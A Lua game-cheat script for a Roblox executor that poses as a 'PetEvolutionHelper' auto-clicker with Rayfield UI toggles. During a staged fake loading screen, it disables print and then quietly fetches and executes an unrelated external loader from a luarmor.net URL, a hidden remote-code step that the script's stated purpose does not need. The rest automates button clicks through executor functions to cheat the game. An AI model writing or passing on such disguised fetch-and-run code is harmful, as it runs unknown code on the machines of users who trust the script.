-- Load Rayfield UI Library
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()

-- Create Rayfield Interface Window with the loading sequence
local Window = Rayfield:CreateWindow({
    Name = "PetEvolutionHelper",  -- The name of the script in the window
    Icon = 0,
    LoadingTitle = "Loading remotes...",  -- Initial loading title
    LoadingSubtitle = "Please wait, loading remotes...",
    Theme = "Default",

    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,

    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },

    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },

    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

-- Custom function for the loading sequence in Rayfield UI
local function customLoadingSequence()
    -- Display the initial loading state
    Window.LoadingTitle = "Loading remotes..."
    -- Redirecting print to do nothing
    print = function() end

    -- Load and execute the external script
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e4315db490a84e920190f83279c4732e.lua"))()

    
    Window.LoadingSubtitle = "Please wait, loading remotes..."
    wait(2)  -- Simulate loading remotes

    -- Update with next loading stage
    Window.LoadingTitle = "Loading Modules..."
    Window.LoadingSubtitle = "Loading Modules... Almost there."
    wait(2)  -- Simulate loading modules

    -- Update with next loading stage
    Window.LoadingTitle = "Loading Resources..."
    Window.LoadingSubtitle = "Loading Resources... Almost done."
    wait(2)  -- Simulate loading resources

    -- Update with next loading stage
    Window.LoadingTitle = "Loading Rayfield UI..."
    Window.LoadingSubtitle = "Loading Rayfield UI... Please wait."
    wait(2)  -- Simulate loading Rayfield UI

    -- Display final loading message
    Window.LoadingTitle = "RayField UI has been Loaded!"
    Window.LoadingSubtitle = "RayField UI has been Loaded! You’re all set!"
    wait(2)  -- Simulate finishing the loading
end

-- Run the custom loading sequence (show the loading screen first)
customLoadingSequence()

-- Now that loading is complete, create the Tab with toggles

-- Create a Tab in the Window
local Tab = Window:CreateTab("Main", -- Tab Name
    123456789 -- Tab Icon (numeric or string; replace with an icon ID as needed)
)

-- Get the button references
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Tool Button
local toolButton = playerGui:WaitForChild("ToolApp")
    :WaitForChild("Frame")
    :WaitForChild("Hotbar")
    :WaitForChild("ToolContainer")
    :FindFirstChild("Tool")

-- Dialog Button
local dialogButton = playerGui:WaitForChild("DialogApp")
    :WaitForChild("Dialog")
    :WaitForChild("NormalDialog")
    :WaitForChild("Buttons")
    :FindFirstChild("ButtonTemplate")

-- Function to safely click a button
local function clickButton(button)
    if button then
        pcall(function()
            -- Trigger MouseButton1Down, MouseButton1Click, and MouseButton1Up events
            for _, connection in pairs(getconnections(button.MouseButton1Down)) do
                connection:Fire()
            end
            wait(0.1)
            for _, connection in pairs(getconnections(button.MouseButton1Click)) do
                connection:Fire()
            end
            wait(0.1)
            for _, connection in pairs(getconnections(button.MouseButton1Up)) do
                connection:Fire()
            end
            print("Button clicked!")
        end)
    else
        warn("Button not found!")
    end
end

-- Track the toggle state
local isActiveTool = false
local isActiveDialog = false

-- Controlled loop that runs when isActive is true for Tool Button
local function controlledLoopTool()
    while isActiveTool do
        clickButton(toolButton)
        wait(1) -- Set delay to 1 second to reduce intensity
    end
end

-- Controlled loop that runs when isActive is true for Dialog Button
local function controlledLoopDialog()
    while isActiveDialog do
        clickButton(dialogButton)
        wait(1) -- Set delay to 1 second to reduce intensity
    end
end

-- Function to update the toggle state for tool button
local function toggleClickingTool(value)
    isActiveTool = value
    if isActiveTool then
        print("Continuing script execution for Tool Button (On)!") 
        controlledLoopTool() -- Start clicking in a loop while isActiveTool is true
    else
        print("Script execution for Tool Button turned off (Off)!")
    end
end

-- Function to update the toggle state for dialog button
local function toggleClickingDialog(value)
    isActiveDialog = value
    if isActiveDialog then
        print("Continuing script execution for Dialog Button (On)!")
        controlledLoopDialog() -- Start clicking in a loop while isActiveDialog is true
    else
        print("Script execution for Dialog Button turned off (Off)!")
    end
end

-- Create Toggle for Tool Button
Tab:CreateToggle({
    Name = "Activate Tool Button",         -- Title of the Toggle
    CurrentValue = false,                  -- Default state (true or false)
    Flag = "ToggleTool",                   -- Unique identifier for this toggle
    Callback = function(Value)
        toggleClickingTool(Value) -- Pass the toggle state to toggleClickingTool
    end,
})

-- Create Toggle for Dialog Button
Tab:CreateToggle({
    Name = "Activate Dialog Button",        -- Title of the Toggle
    CurrentValue = false,                  -- Default state (true or false)
    Flag = "ToggleDialog",                  -- Unique identifier for this toggle
    Callback = function(Value)
        toggleClickingDialog(Value) -- Pass the toggle state to toggleClickingDialog
    end,
})

print("Rayfield UI initialized with toggles for both Tool Button and Dialog Button functions.")
